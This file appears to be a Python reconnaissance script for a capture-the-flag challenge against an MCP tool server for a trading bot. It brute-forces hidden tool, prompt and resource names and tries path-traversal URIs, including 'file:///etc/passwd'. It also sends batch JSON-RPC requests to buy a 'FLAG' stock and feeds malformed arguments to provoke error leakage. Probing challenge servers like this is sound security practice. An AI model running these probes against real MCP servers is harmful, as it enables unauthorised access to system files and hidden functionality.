#!/usr/bin/env python3
"""New-angle recon: pagination, hidden tools, HTTP paths, auth headers, batch, errors."""
import json, requests
from mcpclient import MCP, extract, BASE

m = MCP()
S = m.s
H = m.headers()

print("=== tools/list with cursor ===")
r = m.call("tools/list", {"cursor": "x"})
print(json.dumps(r)[:400])
print("=== resources/list with cursor ===")
print(json.dumps(m.call("resources/list", {"cursor":"x"}))[:300])

print("\n=== hidden tool name brute (tools/call) ===")
names = ["settle_order","settle","settlement","engine","vault","read_vault","get_vault","vault_read",
         "reserve","reserve_note","get_reserve","flag","get_flag","debug","admin","internal",
         "route_order","fill_order","process_order","execute_order","list_all_stocks","list_vault",
         "get_order","orders","positions","deposit","withdraw","transfer","audit","integrity",
         "get_integrity","read_instrument","get_instrument","instrument","price","get_price"]
for n in names:
    rr = extract(m.tool(n, {}))
    if "Unknown tool" not in rr:
        print(f"  HIT {n}: {rr[:200]}")

print("\n=== hidden prompt brute ===")
for n in ["tradebot","trading","stock","portfolio","orders","welcome","intro","instructions","system_prompt"]:
    rr = m.call("prompts/get", {"name": n, "arguments": {}})
    if rr.get("result"):
        print(f"  HIT prompt {n}: {json.dumps(rr)[:200]}")

print("\n=== resource URI more ===")
uris = ["vault://FLAG","vault://reserve","vault://note","reserve://note","reserve://FLAG",
        "engine://vault","engine://flag","settlement://vault","tradebot://vault","tradebot://flag",
        "stock://FLAG/price","price://FLAG","instrument://FLAG/price","orderbook://private",
        "orderbook://FLAG","vault:///flag","vault:////flag.txt","file:///etc/passwd",
        "portfolio://status?x=1","portfolio://status/../flag","portfolio://status%2fflag"]
for u in uris:
    rr = m.call("resources/read", {"uri": u})
    if rr.get("result"):
        print(f"  HIT {u}: {json.dumps(rr)[:200]}")

print("\n=== batch JSON-RPC ===")
batch = [
    {"jsonrpc":"2.0","id":101,"method":"tools/call","params":{"name":"place_order","arguments":{"symbol":"FLAG","quantity":1,"order_type":"buy"}}},
    {"jsonrpc":"2.0","id":102,"method":"tools/call","params":{"name":"get_stock_price","arguments":{"symbol":"FLAG"}}},
]
resp = S.post(BASE+"/mcp", json=batch, headers=H, timeout=30)
print("batch status", resp.status_code, resp.text[:400])

print("\n=== error leakage (bad types) ===")
for name, args in [("place_order", {"symbol": {"a":1}, "quantity":"x", "order_type":["buy"]}),
                   ("get_stock_price", {"symbol": None}),
                   ("get_order_status", {"order_id": 123})]:
    resp = S.post(BASE+"/mcp", json={"jsonrpc":"2.0","id":999,"method":"tools/call","params":{"name":name,"arguments":args}}, headers=H, timeout=30)
    print(f"  {name}: {resp.text[:300]}")
